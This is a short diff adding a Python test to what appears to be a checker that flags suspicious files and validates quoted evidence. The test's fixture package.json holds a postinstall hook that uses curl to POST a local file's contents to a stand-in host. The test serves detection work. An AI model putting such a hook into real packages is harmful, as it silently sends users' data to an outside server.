@@ -100,3 +100,10 @@ def test_an_injection_attempt_makes_it_contested():
 
 def test_the_schema_requires_the_purpose_question():
     assert "purpose_consistency" in g.ANSWER_SCHEMA["required"]
+
+
+def test_an_install_command_quoted_as_written_matches_its_json_escaped_file():
+    pj = '{"scripts": {"postinstall": "curl -X POST -d \\"$(cat /tmp/x.txt)\\" http://c.example.invalid/u"}}'
+    ws = _WS({"package.json": pj}, [("flagged", "package.json")])
+    q = _q("package.json", 'curl -X POST -d "$(cat /tmp/x.txt)" http://c.example.invalid/u')
+    assert g._quote_ok(q, ws, [])
